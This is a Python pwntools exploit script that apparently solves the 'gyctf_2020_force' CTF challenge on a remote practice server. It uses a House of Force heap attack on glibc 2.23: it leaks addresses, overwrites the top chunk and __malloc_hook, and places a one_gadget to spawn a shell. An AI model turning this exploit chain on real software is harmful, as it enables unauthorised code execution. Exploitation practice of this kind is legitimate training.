import re
from pwn import *
import os


def get_process_pid(name):
    pid_list = []
    processes = os.popen('ps -ef | grep %s' % name)
    process_info = processes.read()
    for i in process_info.split('\n')[:-1]:
        j = re.split(' +', i)
        if j[7] == name:
            pid_list.append(int(j[1]))
    return pid_list[0]


elf = ELF('./gyctf_2020_force')
libc = ELF('/root/git_clones/glibc_run/glibc_versions/2.23/x64/lib/libc.so.6')
# io = process(['glibc_run', '2.23', './gyctf_2020_force'])
io = remote('node5.buuoj.cn', 29751)

time.sleep(1)
# pid = get_process_pid('./gyctf_2020_force')

io.sendlineafter(b'2:puts\n', b'1')
io.sendlineafter(b'size\n', str(0x200000).encode())
io.recvuntil(b'bin addr 0x')
heap_addr = int(io.recvuntil(b'\n', drop=True).decode(), 16)
print(hex(heap_addr))
io.sendlineafter(b'content\n', b'aaaa')
libc_addr = heap_addr + 0x200FF0
__malloc_hook = libc_addr + libc.symbols['__malloc_hook']
realloc = libc_addr + libc.symbols['realloc']
print("__malloc_hook: " + hex(__malloc_hook))

io.sendlineafter(b'2:puts\n', b'1')
io.sendlineafter(b'size\n', str(0x18).encode())
io.recvuntil(b'bin addr 0x')
heap_addr1 = int(io.recvuntil(b'\n', drop=True).decode(), 16)
print(hex(heap_addr1))
top_chunk_size_addr = heap_addr1 + 0x10
io.sendlineafter(b'content\n', cyclic(0x18) + packing.p64(__malloc_hook - top_chunk_size_addr + 0x100))

io.sendlineafter(b'2:puts\n', b'1')
io.sendlineafter(b'size\n', str(__malloc_hook - top_chunk_size_addr - 0x30).encode())
io.sendlineafter(b'content\n', b'aaaa')

one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

io.sendlineafter(b'2:puts\n', b'1')
io.sendlineafter(b'size\n', str(0x20).encode())
io.sendlineafter(b'content\n', packing.p64(0) + packing.p64(one_gadgets[1] + libc_addr) + packing.p64(realloc + 0x10))

# gdb.attach(pid)
io.sendlineafter(b'2:puts\n', b'1')
io.sendlineafter(b'size\n', str(0x20).encode())

io.interactive()
